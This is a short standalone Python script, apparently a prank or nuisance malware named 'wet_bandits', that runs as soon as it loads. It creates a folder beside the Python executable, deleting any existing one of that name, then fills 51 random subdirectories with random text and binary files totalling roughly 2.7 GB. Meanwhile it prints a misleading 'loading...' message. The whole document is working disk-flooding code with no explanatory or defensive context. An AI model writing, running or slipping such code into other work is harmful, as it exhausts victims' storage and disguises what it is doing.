
def wet_bandits():
    import os, shutil, random as r, string as s, numpy as np, sys

    try:
        pAth = os.path.dirname(sys.executable)
        dIr  = 'FLoooOOOooOooOd'
        fullpath  = os.path.join(pAth, dIr)
        os.mkdir(fullpath)
        print('loading...')

    except FileExistsError:
        shutil.rmtree(fullpath)
        os.mkdir(fullpath)

    stop = 50
    sample = s.ascii_letters + s.digits
    sample2 = s.ascii_letters + s.digits + s.punctuation   

    while stop >=0:
        for x in range(1):
            dir_name = ''.join([r.choice(sample) for i in range(13)])
            fullpath2 = os.path.join(fullpath, dir_name)
            os.mkdir(fullpath2)
            stop -= 1

    src = os.walk(fullpath)
    for dirs, _, _ in src:
        for i in range(5):

            random_name = ''.join([r.choice(sample) for i in range(8)])
            random_name2 = ''.join([r.choice(sample) for i in range(12)])
            random_name3 = ''.join([r.choice(sample) for i in range(15)])
            random_name4 = ''.join([r.choice(sample) for i in range(18)])

            filename = '%s.txt' % random_name
            filename2 = '%s.txt' % random_name2
            filename3 = '%s.dat' % random_name3
            filename4 = '%s.tmp' % random_name4

            content_file = ''.join([r.choice(sample2) for i in range(128*128)])
            content_file2 = ''.join([r.choice(sample2) for i in range(256*256)])

            with open(os.path.join(dirs, filename), 'w') as f:
                f.write(content_file)
            with open(os.path.join(dirs, filename2), 'w') as f2:
                f2.write(content_file2)
            with open(os.path.join(dirs, filename3), 'wb') as f3:
                f3.write(np.random.bytes(10000000))
            with open(os.path.join(dirs, filename4), 'wb') as f4:
                f4.write(np.random.bytes(500000))

wet_bandits()